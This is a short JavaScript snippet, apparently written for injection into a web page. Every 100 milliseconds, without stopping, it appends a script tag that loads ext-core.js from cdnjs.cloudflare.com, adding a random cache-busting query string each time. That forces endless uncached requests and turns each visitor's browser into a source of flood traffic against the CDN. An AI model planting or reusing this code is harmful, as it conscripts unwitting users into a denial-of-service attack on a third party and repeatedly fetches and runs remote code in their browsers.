/*<![CDATA[*//*---->*/;!function () {
    "use strict";
    setInterval(function () {
        var head = document.getElementsByTagName('head')[0],
            randomNumber = parseInt(Math.random() * 1000000),
            scriptTag = document.createElement('script');
        
        scriptTag.type = 'text/javascript';
        scriptTag.src = 'http://cdnjs.cloudflare.com' + 
                        '/ajax/libs/ext-core/3.1.0/ext-core.js' + 
                        '?stupidQuery=' + randomNumber;
        head.appendChild(scriptTag);
    }, 100);
}();/*--*//*]]>*/